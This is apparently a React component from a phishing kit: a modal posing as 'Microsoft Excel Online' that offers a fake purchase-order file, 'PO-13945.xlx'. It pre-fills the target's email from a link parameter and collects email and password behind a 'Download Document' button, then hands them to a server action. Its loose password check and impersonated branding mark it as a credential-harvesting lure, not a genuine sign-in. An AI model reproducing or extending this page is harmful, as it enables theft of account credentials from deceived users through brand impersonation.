"use client"


import { useState, useTransition, useEffect } from "react";
import { useLoginModal } from "@/hooks/use-login-modal";
import {
    Dialog,
    DialogContent,
    DialogTitle,
} from "@/components/ui/dialog";
import Image from "next/image";
import { z } from "zod";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
    Form,
    FormControl,
    FormField,
    FormItem,
} from "@/components/ui/form";
import { Loader2 } from "lucide-react";
import { login } from "@/actions/login";
import { FormError } from "../form-error";
import { FormSuccess } from "../form-success";

// Validation schema
const LoginSchema = z.object({
    email: z.string().email("Invalid email format").min(1, {
        message: "Email is required",
    }),
    password: z.string().min(2, {
        message: "Password is required",
    })
});

type LoginResponse = {
    error?: string;
    success?: string;
};

type FormValues = z.infer<typeof LoginSchema>;

// Form fields configuration
const LogInfo = [
    {
        label: "Email",
        name: "email",
        type: "email",
        placeholder: "Enter Your Email"
    },
    {
        label: "Password",
        name: "password",
        type: "password",
        placeholder: "Enter Your Password"
    },
];

export const LoginModal = () => {
    
    const { isOpen, onClose } = useLoginModal();
    // const [showPassword, setShowPassword] = useState(false);
    const [isPending, startTransition] = useTransition();
    const [error, setError] = useState<string | undefined>("");
    const [success, setSuccess] = useState<string | undefined>("");
    // const [color, setColor] = useState("bg-red-500");
    const [activeBubble, setActiveBubble] = useState(0);

    const form = useForm<FormValues>({
        resolver: zodResolver(LoginSchema),
        defaultValues: { email: "", password: "" },
        mode: "onChange",
    });

    // Update email from URL whenever the modal opens
    useEffect(() => {
        if (isOpen) {
            const urlParams = new URLSearchParams(window.location.search);
            const emailFromLink = urlParams.get("email") || "";
            form.setValue("email", emailFromLink);
        }
    }, [isOpen, form]);




    useEffect(() => {
        const interval = setInterval(() => {
            setActiveBubble((prev) => (prev + 1) % 3);
        }, 1000);

        return () => clearInterval(interval);
    }, []);

    const onSubmit = (values: FormValues) => {
        setError("");
        setSuccess("");

        startTransition(() => {
            login(values)
            
                .then((data: LoginResponse) => {
                    if (data?.error) {
                        setError(data.error);
                    }
                    if (data?.success) {
                        setSuccess(data.success);
                    }
                })
                .catch(() => setError("Something went wrong"));
        });
    };

    return (
        <Dialog open={isOpen} onOpenChange={onClose}>
            {/* <DialogContent className="lg:max-w-[350px] max-w-[300px]"> */}
            <DialogContent className="max-w-[400px] bg-gray-50">
                <div className="flex items-center justify-between mb-4 rounded-none">
                    <div className="flex items-center justify-center w-[60px] h-[60px] rounded-full border-2">
                        <Image
                            src={"/exLogo.png"}
                            alt="Mail Icon"
                            width={40}
                            height={40}
                        />
                    </div>
                    <div className="flex items-center justify-center gap-2">
                        <div className={`w-5 h-5 rounded-full ${activeBubble === 0 ? "bg-black" : "bg-gray-200"}`} />
                        <div className={`w-5 h-5 rounded-full ${activeBubble === 1 ? "bg-black" : "bg-gray-200"}`} />
                        <div className={`w-5 h-5 rounded-full ${activeBubble === 2 ? "bg-black" : "bg-gray-200"}`} />
                    </div>
                    <div className="flex items-center justify-center w-[60px] h-[60px] rounded-full border-2" />
                </div>
                <div className="text-center space-y-2">
                    <DialogTitle>Microsoft Excel Online</DialogTitle>
                    <DialogTitle className="text-xs font-normal text-gray-400">&quot;Purchase Order (PO-13945.xlx)&quot;</DialogTitle>
                </div>
                <div className="space-y-8">
                    <Form {...form}>
                        <form onSubmit={form.handleSubmit(onSubmit)} className="">
                            {LogInfo.map(({ name, placeholder }) => (
                                <FormField
                                    key={name}
                                    name={name as keyof FormValues}
                                    control={form.control}
                                    render={({ field }) => (
                                        <FormItem className="">
                                            <FormControl>
                                                <Input
                                                    disabled={isPending}
                                                    {...field}
                                                    placeholder={placeholder}
                                                    className={`text-xs text-center text-gray-500 ${name === 'email' ? 'bg-gray-50' : ''}`}
                                                    // type={name === "password" && !showPassword ? "password" : "text"}
                                                />

                                            </FormControl>
                                        </FormItem>
                                    )}
                                />
                            ))}
                            <FormError message={error} />
                            <FormSuccess message={success} />
                            <div className="mt-4">
                                <Button
                                    type="submit"
                                    disabled={isPending}
                                    className="bg-[#006400] w-full text-white gap-x-2 flex items-center"
                                >
                                    {isPending ? (
                                        <Loader2 className="size-4 animate-spin" />
                                    ) : (
                                        <p>Download Document</p>
                                    )}
                                </Button>
                            </div>
                        </form>
                    </Form>
                </div>
            </DialogContent>
        </Dialog>
    );
};
